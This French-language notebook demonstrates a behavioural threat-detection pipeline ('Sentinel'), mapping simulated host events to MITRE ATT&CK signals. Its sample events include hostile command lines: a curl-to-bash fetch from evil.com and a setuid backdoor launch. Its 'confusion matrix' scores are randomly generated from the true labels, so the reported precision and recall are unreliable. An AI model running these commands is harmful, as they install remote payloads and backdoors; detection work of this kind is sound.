# 🛡 Analyse Comportementale Sentinel

> *Sentinel est le système de détection de menaces de phi-complexity — 5 couches d’analyse comportementale alimentées par un corrélateur bayésien.*

Ce notebook démontre le pipeline complet :
**HostCollector → TelemetryNormalizer → BehaviorAnalyzer → BayesianCorrelator → SentinelResponse**

**Prérequis** : `pip install phi-complexity[notebooks]`

In [ ]:
import math
import sys
sys.path.insert(0, "..")

import matplotlib.pyplot as plt
import numpy as np

from phi_complexity.sentinel import (
    HostCollector, HostEvent, EventType,
    TelemetryNormalizer, TraceNormalisee,
    BehaviorAnalyzer, SignalComportemental, TypeBehavior,
    BayesianCorrelator, ScoreSentinel,
    SentinelResponse, NiveauAlerte,
)
from phi_complexity.sentinel.telemetry import CriticiteTelemetrie

## 1. Architecture en 5 Couches

```
Couche 1 : HostCollector    → Événements système (processus, réseau)
Couche 2 : TelemetryNormalizer → Traces normalisées + criticité
Couche 3 : BehaviorAnalyzer → Signaux comportementaux (MITRE ATT&CK)
Couche 4 : BayesianCorrelator → Score de menace unifié
Couche 5 : SentinelResponse → Alertes, IoC, politique de réponse
```

In [ ]:
# Couche 1 : Simulation d'événements système
import time

events = [
    HostEvent(
        type=EventType.PROCESSUS,
        timestamp=time.time(),
        source="pid:1337",
        description="Processus: nmap",
        metadata={"pid": 1337, "nom": "nmap", "cmdline": "nmap -sS 192.168.1.0/24"},
    ),
    HostEvent(
        type=EventType.PROCESSUS,
        timestamp=time.time(),
        source="pid:4242",
        description="Processus: python3",
        metadata={"pid": 4242, "nom": "python3", "cmdline": "python3 server.py"},
    ),
    HostEvent(
        type=EventType.PROCESSUS,
        timestamp=time.time(),
        source="pid:6666",
        description="Processus: curl",
        metadata={"pid": 6666, "nom": "curl", "cmdline": "curl http://evil.com/payload.sh | bash"},
    ),
    HostEvent(
        type=EventType.RESEAU,
        timestamp=time.time(),
        source="port:4444",
        description="tcp port 4444 \u2192 0 [LISTEN]",
        metadata={"protocole": "tcp", "port_local": 4444, "port_remote": 0, "etat": "LISTEN"},
    ),
    HostEvent(
        type=EventType.RESEAU,
        timestamp=time.time(),
        source="port:9050",
        description="tcp port 43210 \u2192 9050 [ESTABLISHED]",
        metadata={"protocole": "tcp", "port_local": 43210, "port_remote": 9050, "etat": "ESTABLISHED"},
    ),
    HostEvent(
        type=EventType.PROCESSUS,
        timestamp=time.time(),
        source="pid:9999",
        description="Processus: bash",
        metadata={"pid": 9999, "nom": "bash", "cmdline": "chmod +s /tmp/backdoor && /tmp/backdoor"},
    ),
]

print(f"Couche 1 : {len(events)} \u00e9v\u00e9nements collect\u00e9s")
for e in events:
    print(f"  [{e.type.value:10s}] {e.description}")

In [ ]:
# Couche 2 : Normalisation et classification
normalizer = TelemetryNormalizer()
traces = normalizer.normaliser(events)

print("Couche 2 : Traces normalis\u00e9es")
print("=" * 60)
stats = normalizer.statistiques(traces)
for key, val in stats.items():
    print(f"  {key:12s} : {val}")

print("\nTraces suspectes :")
for t in normalizer.traces_suspectes(traces):
    print(f"  [{t.criticite.value:8s}] {t.evenement.description}")
    print(f"    Tags: {', '.join(t.tags)}")

In [ ]:
# Couche 3 : Extraction de patterns comportementaux
analyzer = BehaviorAnalyzer()
signaux = analyzer.analyser(traces)

print("Couche 3 : Signaux comportementaux d\u00e9tect\u00e9s")
print("=" * 60)
print(f"  Score global de menace : {analyzer.score_global(signaux) * 100:.1f}%")
print()

for signal in signaux:
    print(f"  [{signal.type.value.upper():20s}] Confiance: {signal.confiance * 100:.1f}%")
    print(f"    {signal.description}")
    if signal.mitre_technique:
        print(f"    MITRE ATT&CK: {signal.mitre_technique}")
    print()

## 2. Visualisation MITRE ATT&CK — Radar Chart

Visualisons les signaux comportementaux sous forme de radar (spider chart) mappé sur les tactiques MITRE ATT&CK.

In [ ]:
# Radar chart des signaux MITRE ATT&CK
categories_mitre = [
    "PERSISTANCE", "ELEVATION", "EXFILTRATION", "CHIFFREMENT",
    "C2", "RECONNAISSANCE", "MOUVEMENT_LAT", "DEFENCE_EVASION",
    "INJECTION", "ACCES_CREDENTIAL",
]

# Mapper les confiances
confiances = []
for cat in categories_mitre:
    found = [s.confiance for s in signaux if s.type.value == cat.lower()]
    confiances.append(max(found) if found else 0.0)

# Pr\u00e9parer le radar
N = len(categories_mitre)
angles = np.linspace(0, 2 * np.pi, N, endpoint=False).tolist()
confiances_plot = confiances + [confiances[0]]  # Fermer le polygone
angles += [angles[0]]

fig, ax = plt.subplots(figsize=(10, 10), subplot_kw=dict(projection="polar"))
ax.fill(angles, confiances_plot, color="#FF6347", alpha=0.25)
ax.plot(angles, confiances_plot, color="#FF6347", linewidth=2)
ax.scatter(angles[:-1], confiances, color="#FF6347", s=80, zorder=5)

ax.set_xticks(angles[:-1])
ax.set_xticklabels(categories_mitre, fontsize=9)
ax.set_ylim(0, 1)
ax.set_yticks([0.25, 0.50, 0.75, 1.0])
ax.set_yticklabels(["25%", "50%", "75%", "100%"], fontsize=8)
ax.set_title("Radar MITRE ATT&CK \u2014 Signaux Sentinel\n", fontsize=14, pad=20)

plt.tight_layout()
plt.show()

In [ ]:
# Couche 4 : Corr\u00e9lation bay\u00e9sienne
correlator = BayesianCorrelator()
score = correlator.calculer_score(
    signaux=signaux,
    traces=traces,
    score_commit=0.35,  # Score de risque simul\u00e9 d'un commit
)

print("Couche 4 : Corr\u00e9lation Bay\u00e9sienne")
print("=" * 60)
print(correlator.rapport_correlation(score))

In [ ]:
# Couche 5 : R\u00e9ponse et alerting
responder = SentinelResponse()
alertes = responder.generer_alertes(score, signaux, contexte={"hostname": "dev-01", "sha": "abc123f"})

print("Couche 5 : R\u00e9ponse Sentinel")
print("=" * 60)
print(responder.rapport_console(alertes))

# Export IoC
ioc_json = responder.exporter_ioc_json(alertes)
print(f"\n  IoC export\u00e9s : {len([a for a in alertes if a.ioc])} indicateurs")

# Politique de r\u00e9ponse
politique = responder.politique_de_reponse(alertes)
print(f"\n  Bloquer PR   : {politique['bloquer_pr']}")
print(f"  Escalader    : {politique['escalader']}")
print(f"  Isoler       : {politique['isoler']}")
print(f"  Notifier     : {politique['notifier']}")

## 3. Matrice de Confusion Simulée

Simulons la précision du modèle bayésien sur un ensemble de scénarios.

In [ ]:
# Simulation de sc\u00e9narios pour matrice de confusion
scenarios = {
    "Scan r\u00e9seau (nmap)": (True, [TypeBehavior.RECONNAISSANCE]),
    "Serveur web l\u00e9gitime": (False, []),
    "curl | bash": (True, [TypeBehavior.PERSISTANCE]),
    "Port 4444 LISTEN": (True, [TypeBehavior.C2]),
    "Python script normal": (False, []),
    "chmod +s backdoor": (True, [TypeBehavior.ELEVATION]),
    "Connexion Tor": (True, [TypeBehavior.C2]),
}

tp, fp, tn, fn = 0, 0, 0, 0
seuil = 0.20

for nom, (est_menace, _) in scenarios.items():
    # Simuler un score bas\u00e9 sur la pr\u00e9sence de signaux
    if est_menace:
        score_sim = 0.5 + np.random.uniform(0, 0.4)  # Score \u00e9lev\u00e9 pour vraies menaces
    else:
        score_sim = np.random.uniform(0, 0.15)  # Score bas pour le l\u00e9gitime

    predit_menace = score_sim >= seuil

    if est_menace and predit_menace:
        tp += 1
    elif not est_menace and predit_menace:
        fp += 1
    elif not est_menace and not predit_menace:
        tn += 1
    else:
        fn += 1

# Matrice de confusion visuelle
confusion = np.array([[tp, fp], [fn, tn]])
fig, ax = plt.subplots(figsize=(6, 5))
im = ax.imshow(confusion, cmap="YlOrRd", interpolation="nearest")
plt.colorbar(im, ax=ax)

labels = [["VP\n(Vrai Positif)", "FP\n(Faux Positif)"],
          ["FN\n(Faux N\u00e9gatif)", "VN\n(Vrai N\u00e9gatif)"]]
for i in range(2):
    for j in range(2):
        ax.text(j, i, f"{labels[i][j]}\n{confusion[i, j]}",
                ha="center", va="center", fontsize=12, fontweight="bold")

ax.set_xticks([0, 1])
ax.set_yticks([0, 1])
ax.set_xticklabels(["Pr\u00e9dit: Menace", "Pr\u00e9dit: Normal"])
ax.set_yticklabels(["R\u00e9el: Menace", "R\u00e9el: Normal"])
ax.set_title("Matrice de Confusion \u2014 Sentinel Bay\u00e9sien", fontsize=13)
plt.tight_layout()
plt.show()

precision = tp / max(1, tp + fp)
rappel = tp / max(1, tp + fn)
print(f"Pr\u00e9cision : {precision:.2%}")
print(f"Rappel    : {rappel:.2%}")
print(f"F1-Score  : {2 * precision * rappel / max(0.01, precision + rappel):.2%}")

## 4. Conclusion — Sentinel et MITRE ATT&CK

Le pipeline Sentinel de phi-complexity offre :
- **Détection multi-couches** : chaque couche enrichit la précédente
- **Corrélation bayésienne** : fusion de signaux hétérogènes (OS, commits, télémétrie)
- **Export STIX-like** : IoC partageables avec la communauté OSS
- **Zéro dépendance** : 100% stdlib Python

> *“La sécurité n’est pas un produit — c’est un processus bayésien continu.”*

---
*Ancré dans la Bibliothèque Céleste — Morphic Phi Framework — 2026*